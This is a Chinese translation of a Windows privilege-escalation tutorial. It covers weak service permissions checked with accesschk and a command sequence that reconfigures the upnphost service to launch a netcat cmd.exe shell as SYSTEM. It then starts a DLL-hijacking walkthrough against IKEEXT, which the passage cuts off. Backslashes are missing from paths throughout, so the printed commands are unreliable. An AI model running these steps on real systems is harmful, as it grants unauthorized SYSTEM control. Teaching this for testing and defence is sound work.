# 【技术分享】Windows下的渗透测试之提权的基本套路（下）
|
##### 译文声明
本文是翻译文章，文章来源：fuzzysecurity
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**翻译：[ **慕容禽兽**](http://bobao.360.cn/member/contribute?uid=2667655202)**
**稿费：200RMB（不服你也来投稿啊！）**
**投稿方式：发送邮件至linwei#360.cn，或登陆 ** **[
**网页版**](http://bobao.360.cn/contribute/index)**** 在线投稿**
**传送门**
[**【技术分享】Windows下的渗透测试之提权的基本套路（上）**](http://bobao.360.cn/learning/detail/3158.html)
****
**从t7到t10 – 撸起袖子大干一场**
到现在这个阶段，我希望我们已经有了一个SYSTEM的shell，但是如果我们还没有，仍有一些其它的途径去获得SYSTEM权限。在这个最后的部分，我们将目光投向Windows的服务和文件及文件夹权限。我们的目标是使用弱权限（权限的错误配置）来提升权限。
我们将检查大量的访问权限，所以我们可以在微软的Sysinternals工具包中拷贝accesschk.exe来使用。“Microsoft
Sysinternals”包含了大量优秀的工具，非常遗憾，微软没有将它们放在Windows自带工具中。你可以从这里下载[[这里]](http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx)。
我们将从Windows服务下手，因为往往一些立竿见影的东西会在这里被发现。通常，现在的操作系统不会存在有漏洞的服务，所以，有漏洞的意思是我们可以再次配置某个服务的参数。Windwos的服务就像是软件的快捷方式，现在举个栗子：
我们可以使用sc去查询，配置，和管理Windows服务
    C:Windowssystem32> sc qc Spooler
     [SC] QueryServiceConfig SUCCESS
    SERVICE_NAME: Spooler
    TYPE               : 110  WIN32_OWN_PROCESS (interactive)
    START_TYPE         : 2   AUTO_START
    ERROR_CONTROL      : 1   NORMAL
    BINARY_PATH_NAME   : C:WindowsSystem32spoolsv.exe
    LOAD_ORDER_GROUP   : SpoolerGroup
    TAG                : 0
    DISPLAY_NAME       : Print Spooler
    DEPENDENCIES       : RPCSS
                        : http
    SERVICE_START_NAME : LocalSystem
我们可以使用accesschk来检查每个服务需要的权限：
我们可以看到每个用户拥有的权限。你可以使用“accesschk.exe -ucqv *”来列出所有的服务。  
    C:> accesschk.exe -ucqv Spooler
    Spooler
      R  NT AUTHORITYAuthenticated Users
            SERVICE_QUERY_STATUS
            SERVICE_QUERY_CONFIG
            SERVICE_INTERROGATE
            SERVICE_ENUMERATE_DEPENDENTS
            SERVICE_USER_DEFINED_CONTROL
            READ_CONTROL
      R  BUILTINPower Users
            SERVICE_QUERY_STATUS
            SERVICE_QUERY_CONFIG
            SERVICE_INTERROGATE
            SERVICE_ENUMERATE_DEPENDENTS
            SERVICE_START
            SERVICE_USER_DEFINED_CONTROL
            READ_CONTROL
      RW BUILTINAdministrators
            SERVICE_ALL_ACCESS
      RW NT AUTHORITYSYSTEM
            SERVICE_ALL_ACCESS
Accesschk可以自动的检查当我们使用一个特定的用户时，我们是否对Windows的某个服务有写的权限。作为一个低权限用户，我们首先就想要看一下“Authenticated
Users”组对这些服务的权限。确保你没有搞错，你的用户属于哪个用户组，举个栗子，“Power Users”被认为是一个低权限用户组（它使用的不多）
让我们将Windows 8 和 Windows XP SP0的输出进行对比：
    Windows 8：
     C:Usersb33ftoolsSysinternals> accesschk.exe -uwcqv "Authenticated Users" *
     No matching objects found.
在默认的Windwos XP SP0，我们可以看到，有一个超级大的系统缺陷：
    C:> accesschk.exe -uwcqv "Authenticated Users" *
     RW SSDPSRV
             SERVICE_ALL_ACCESS
     RW upnphost
             SERVICE_ALL_ACCESS
     C:> accesschk.exe -ucqv SSDPSRV
     SSDPSRV
       RW NT AUTHORITYSYSTEM
             SERVICE_ALL_ACCESS
       RW BUILTINAdministrators
             SERVICE_ALL_ACCESS
       RW NT AUTHORITYAuthenticated Users
             SERVICE_ALL_ACCESS
       RW BUILTINPower Users
             SERVICE_ALL_ACCESS
       RW NT AUTHORITYLOCAL SERVICE
             SERVICE_ALL_ACCESS
     C:> accesschk.exe -ucqv upnphost
     upnphost
       RW NT AUTHORITYSYSTEM
             SERVICE_ALL_ACCESS
       RW BUILTINAdministrators
             SERVICE_ALL_ACCESS
       RW NT AUTHORITYAuthenticated Users
             SERVICE_ALL_ACCESS
       RW BUILTINPower Users
             SERVICE_ALL_ACCESS
       RW NT AUTHORITYLOCAL SERVICE
             SERVICE_ALL_ACCESS
这个问题随后在XP SP2就被修复了。然而在SP0和SP1
，它可以被用来作为通用的本地权限提升漏洞，通过对服务的重新配置，我们可以让它使用SYSTEM权限运行任何我们选择的可执行文件。
让我们看下在实践中是怎么做的，在这种情况下，这个服务将执行netcat并且使用SYSTEM权限反弹一个shell。
    C:> sc qc upnphost
     [SC] GetServiceConfig SUCCESS
     SERVICE_NAME: upnphost
             TYPE               : 20  WIN32_SHARE_PROCESS
             START_TYPE         : 3   DEMAND_START
             ERROR_CONTROL      : 1   NORMAL
             BINARY_PATH_NAME   : C:WINDOWSSystem32svchost.exe -k LocalService
             LOAD_ORDER_GROUP   :
             TAG                : 0
             DISPLAY_NAME       : Universal Plug and Play Device Host
             DEPENDENCIES       : SSDPSRV
             SERVICE_START_NAME : NT AUTHORITYLocalService
     C:> sc config upnphost binpath= "C:nc.exe -nv 127.0.0.1 9988 -e C:WINDOWSSystem32cmd.exe"
     [SC] ChangeServiceConfig SUCCESS
     C:> sc config upnphost obj= ".LocalSystem" password= ""
     [SC] ChangeServiceConfig SUCCESS
     C:> sc qc upnphost
     [SC] GetServiceConfig SUCCESS
     SERVICE_NAME: upnphost
             TYPE               : 20  WIN32_SHARE_PROCESS
             START_TYPE         : 3   DEMAND_START
             ERROR_CONTROL      : 1   NORMAL
             BINARY_PATH_NAME   : C:nc.exe -nv 127.0.0.1 9988 -e C:WINDOWSSystem32cmd.exe
             LOAD_ORDER_GROUP   :
             TAG                : 0
             DISPLAY_NAME       : Universal Plug and Play Device Host
             DEPENDENCIES       : SSDPSRV
             SERVICE_START_NAME : LocalSystem
     C:> net start upnphost
我们不是总是对一个服务有完全的访问权限，尽管它被错误的配置了。下面的图是从Brett
Moore's那里扒来的，任何一个下图的访问权限都将给我们一个SYSTEM权限的shell。
记住我们目前的用户属于哪个用户组是很重要的，就像前面提到的“Power Users“,其实就是一个低权限的用户组。“Power
Users”有它自己相关的一系列漏洞，Mark Russinovich曾经写过一篇关于“Power Users“的很有意思的文章。
[[The Power in Power Users (Mark Russinovich) –
here]](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx)
最后，我们将测试文件和文件夹的权限，如果我们不能直接攻击操作系统进行提权，那么我们可以让操作系统做一些事来帮助我们提权，这个涵盖的方面太多了，所以我在这里演示两种权限提升漏洞和利用它们的方式。一旦你掌握了核心方法，就将可以在其它的情况中应用这些方法。
对于我们的第一个例子，我将复现Parvez的做法，他曾写过《Elevating privileges by exploiting weak folder
permissions》，[[Elevating privileges by exploiting weak folder
permissions]](http://www.greyhathacker.net/?p=738)
这个例子是一个特殊的DLL劫持实例，应用程序通常不能通过他们本身来实现一些功能，它们有很多需要hook的资源（大多数是DLL文件但是也有可能是一些专有文件）。如果一个程序或者服务从一个我们有写入权限的目录加载某个文件，那我们就可以利用这个特性来获得一个和这个程序运行权限相同权限的shell。
通常，一个Windows应用将使用预定义的搜索路径去找上文所说的那个需要被加载的DLL，它将按照特定的顺序来检查这些路径。DLL劫持通常通过在这些路径的其中一个（同时要确保这个DLL文件在合法的DLL找到之前被找到）放置一个恶意的DLL文件来进行攻击。这种攻击方式可以通过让被攻击的应用程序对于它要使用的DLL文件，制定一个绝对的路径去放置它们来减轻危害。
下面，你可以看到在32-bit操作系统上的DLL文件的搜索顺序：
1 – 该应用程序所在的目录
2 – 32-bit System directory (C:WindowsSystem32)
3 – 16-bit System directory (C:WindowsSystem)
4 – Windows directory (C:Windows)
5 – The current working directory (CWD)
6 – Directories in the PATH environment variable (system then user)  
有时候，应用程序尝试加载并不存在于当前系统的DLL文件。导致这种情况的理由可能有很多，比如某个DLL文件仅仅被某些没有被安装的插件所需求。在这种情况下，Parvez发现了某些Windows服务尝试去加载不会被默认安装的DLL文件。
既然上文所说的DLL文件不存在，那我们就可以遍历所有搜索路径（例如上文的1-6）来放置我们的恶意DLL文件，但作为一个低权限用户，将一个恶意的DLL文件放在1-4路径中的希望不大。因为我们正在攻击Windwos的服务，而不是某个应用程序，因此5是不可能的。虽然看似这种攻击方式有点难度，但是一旦我们找到符合要求的路径，就屌了。
让我们看下这种攻击方式的实际应用，作为例子，我们将使用尝试去加载wlbsctrl.dll文件的的IKEEXT（IKE and AuthIP IPsec
Keying Modules）服务。
    测试环境是：Win 7 ，低权限用户
     C:Usersuser1Desktop> echo %username%
     user1
    通过下面的结果，可以判断出我们要成功了，因为在C盘下，如果有一个路径不是Windows默认的路径，那么我们就很可能会对它有写入的权限。
     C:Usersuser1Desktop> echo %path%
     C:Windowssystem32;C:Windows;C:WindowsSystem32Wbem;C:WindowsSystem32WindowsPowerShellv1.0;
     C:Program FilesOpenVPNbin;C:Python27
    我们可以使用accesschk或者cacls来检查访问权限。
     C:Usersuser1Desktop> accesschk.exe -dqv "C:Python27"
     C:Python27
       Medium Mandatory Level (Default) [No-Write-Up]
       RW BUILTINAdministrators
             FILE_ALL_ACCESS
       RW NT AUTHORITYSYSTEM
             FILE_ALL_ACCESS
       R  BUILTINUsers
             FILE_LIST_DIRECTORY
             FILE_READ_ATTRIBUTES
             FILE_READ_EA
             FILE_TRAVERSE
             SYNCHRONIZE
             READ_CONTROL
       RW NT AUTHORITYAuthenticated Users
             FILE_ADD_FILE
             FILE_ADD_SUBDIRECTORY
             FILE_LIST_DIRECTORY
             FILE_READ_ATTRIBUTES
             FILE_READ_EA
             FILE_TRAVERSE
             FILE_WRITE_ATTRIBUTES
             FILE_WRITE_EA
             DELETE
             SYNCHRONIZE
             READ_CONTROL
     C:Usersuser1Desktop> cacls "C:Python27"
     C:Python27 BUILTINAdministrators:(ID)F
                 BUILTINAdministrators:(OI)(CI)(IO)(ID)F
                 NT AUTHORITYSYSTEM:(ID)F
                 NT AUTHORITYSYSTEM:(OI)(CI)(IO)(ID)F
                 BUILTINUsers:(OI)(CI)(ID)R
                 NT AUTHORITYAuthenticated Users:(ID)C
                 NT AUTHORITYAuthenticated Users:(OI)(CI)(IO)(ID)C
    在我们继续往下搞之前，我们需要检查一下IKEEXT服务的状态。在下面的例子中可以看出，它被设置成“AUTO_START”，所以它在系统启动后就自动运行了。
     C:Usersuser1Desktop> sc qc IKEEXT
     [SC] QueryServiceConfig SUCCESS
     SERVICE_NAME: IKEEXT
             TYPE               : 20  WIN32_SHARE_PROCESS
             START_TYPE         : 2   AUTO_START
             ERROR_CONTROL      : 1   NORMAL